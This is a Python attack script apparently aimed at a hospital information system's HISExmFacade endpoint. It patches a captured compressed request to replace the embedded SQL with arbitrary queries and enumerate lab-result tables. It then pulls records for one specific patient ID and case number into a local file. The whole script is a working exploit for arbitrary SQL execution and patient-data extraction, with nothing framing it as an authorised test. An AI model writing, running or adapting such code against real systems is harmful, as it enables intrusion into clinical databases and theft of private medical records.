from his_client_final import HISClient
import requests
import zlib
import re

class EAVHunter(HISClient):
    def execute_sql(self, sql):
        try:
             # Use EXM payload
            template_path = "HISExmFacade_payload_0.bin"
            with open(template_path, "rb") as f:
                compressed_template = f.read()

            try:
                decompressed = zlib.decompress(compressed_template)
            except:
                decompressed = compressed_template

            original_sql_bytes = b"SELECT * FROM BASCODE WHERE SYSTEMID = 'ORMPRJ' AND SYSCODETYPE = 'OF' AND HISSYSCODE = 'A03772' AND CANCELYN = 'N'"
            
            target_len = len(original_sql_bytes)
            
            if len(sql) > target_len:
                print(f"[-] SQL too long ({len(sql)} > {target_len}).")
                return None
            
            padded_sql = sql.ljust(target_len)
            
            patched_payload = decompressed.replace(original_sql_bytes, padded_sql.encode('utf-8'))
            final_payload = zlib.compress(patched_payload)
            
            response = requests.post(f"{self.base_url}/HISExmFacade", data=final_payload, headers=self.headers)
            
            if response.status_code == 200:
                dec = zlib.decompress(response.content)
                return dec.decode('utf-8', errors='ignore')
            else:
                return None
        except Exception as e:
            print(f"[-] Error: {e}")
            return None

hunter = EAVHunter()

candidates = set()

# 1. Find tables with RESULT generic columns
print("Searching for generic RESULT/VALUE columns...")
keywords = ['RESULT_VALUE', 'REPORT_VALUE', 'LAB_RESULT', 'TEST_RESULT', 'MEASURE_VALUE']
for kw in keywords:
    sql = f"SELECT OWNER,TABLE_NAME FROM ALL_TAB_COLUMNS WHERE COLUMN_NAME = '{kw}' AND ROWNUM<=50"
    res = hunter.execute_sql(sql)
    if res and "<NewDataSet>" in res:
        matches = re.findall(r'<OWNER>(.*?)</OWNER>\s*<TABLE_NAME>(.*?)</TABLE_NAME>', res)
        for owner, table in matches:
            candidates.add(f"{owner}.{table}")

# 2. Also manually add some likely regex matches from previous list
candidates.add("PCUN.TB_LIS_RESULT")
candidates.add("PCUN.TB_RESULT")
candidates.add("YAOCLOUD2013.INSPECTION")
candidates.add("OPDUSR.VALUELAB") # Guessing base name

print(f"\nScanning {len(candidates)} candidates for data (HHISNUM/HCASENO)...")

with open("lab_eav_results.txt", "w", encoding="utf-8") as f:
    for t in candidates:
        # Check HHISNUM
        q = f"SELECT * FROM {t} WHERE HHISNUM='003617083J'"
        r = hunter.execute_sql(q)
        if r and "<NewDataSet>" in r:
             print(f"!!! FOUND DATA IN {t} (HHISNUM) !!!")
             f.write(f"\n!!! FOUND DATA IN {t} (HHISNUM) !!!\n")
             f.write(r[:5000] + "\n")
        
        # Check HCASENO
        q2 = f"SELECT * FROM {t} WHERE HCASENO='75176986'"
        r2 = hunter.execute_sql(q2)
        if r2 and "<NewDataSet>" in r2:
             print(f"!!! FOUND DATA IN {t} (HCASENO) !!!")
             f.write(f"\n!!! FOUND DATA IN {t} (HCASENO) !!!\n")
             f.write(r2[:5000] + "\n")
